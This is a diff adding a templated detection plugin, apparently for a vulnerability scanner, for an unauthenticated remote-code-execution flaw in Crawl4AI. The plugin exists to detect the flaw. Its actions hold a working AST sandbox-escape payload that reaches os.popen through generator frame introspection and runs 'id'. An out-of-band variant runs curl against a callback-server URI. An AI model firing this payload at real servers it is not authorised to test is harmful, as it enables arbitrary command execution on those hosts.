@@ -1,0 +1,139 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Crawl4AI_AST_Sandbox_Escape_CVE_2026_53753"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-53753"
+  }
+  severity: CRITICAL
+  title: "Unauthenticated Remote Code Execution (AST Sandbox Escape) in Crawl4AI"
+  description: "Crawl4AI versions 0.8.6 and prior contain an unauthenticated remote code execution vulnerability via computed field expression evaluation. An attacker can send a crafted JsonCssExtractionStrategy schema that escapes the AST allow-list using Python generator frame introspection (gi_frame.f_back), reaching real builtins and executing arbitrary OS commands."
+  recommendation: "Upgrade Crawl4AI to version 0.8.7 or higher, enable JWT authentication, and avoid exposing the API to untrusted networks."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-53753"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_crawl4ai"
+  http_request: {
+    method: POST
+    uri: "/crawl"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"urls\": [\"raw://<html><body><div>test</div></body></html>\"]}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"cleaned_html\""
+          },
+          {
+            body: {}
+            contains: "\"success\""
+          }
+        ]
+      }
+    }
+  }
+}
+
+# Without callback server enabled (Reflective Check)
+actions: {
+  name: "trigger_rce_sandbox_escape_reflective"
+  http_request: {
+    method: POST
+    uri: "/crawl"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"urls\":[\"raw://<html><body><div id=\\\"x\\\">content</div></body></html>\"],\"crawler_config\":{\"type\":\"CrawlerRunConfig\",\"params\":{\"extraction_strategy\":{\"type\":\"JsonCssExtractionStrategy\",\"params\":{\"schema\":{\"name\":\"pwn\",\"baseSelector\":\"div\",\"fields\":[{\"name\":\"out\",\"type\":\"computed\",\"expression\":\"(lambda: ((g := (g.gi_frame.f_back.f_back.f_back.f_builtins[\\\"__import__\\\"](\\\"os\\\").popen(\\\"id\\\").read() for i in [1])), list(g))[-1])()\"}]}}}}}}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "uid="
+          }
+        ]
+      }
+    }
+  }
+}
+
+# With callback server enabled (Out-of-Band Check)
+actions: {
+  name: "trigger_rce_sandbox_escape_oob"
+  http_request: {
+    method: POST
+    uri: "/crawl"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"urls\":[\"raw://<html><body><div id=\\\"x\\\">content</div></body></html>\"],\"crawler_config\":{\"type\":\"CrawlerRunConfig\",\"params\":{\"extraction_strategy\":{\"type\":\"JsonCssExtractionStrategy\",\"params\":{\"schema\":{\"name\":\"pwn\",\"baseSelector\":\"div\",\"fields\":[{\"name\":\"out\",\"type\":\"computed\",\"expression\":\"(lambda: ((g := (g.gi_frame.f_back.f_back.f_back.f_builtins[\\\"__import__\\\"](\\\"os\\\").popen(\\\"curl {{ T_CBS_URI }}\\\").read() for i in [1])), list(g))[-1])()\"}]}}}}}}"
+ 
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_crawl4ai",
+    "trigger_rce_sandbox_escape_oob",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+workflows: {
+  actions: [
+    "fingerprint_crawl4ai",
+    "trigger_rce_sandbox_escape_reflective"
+  ]
+}
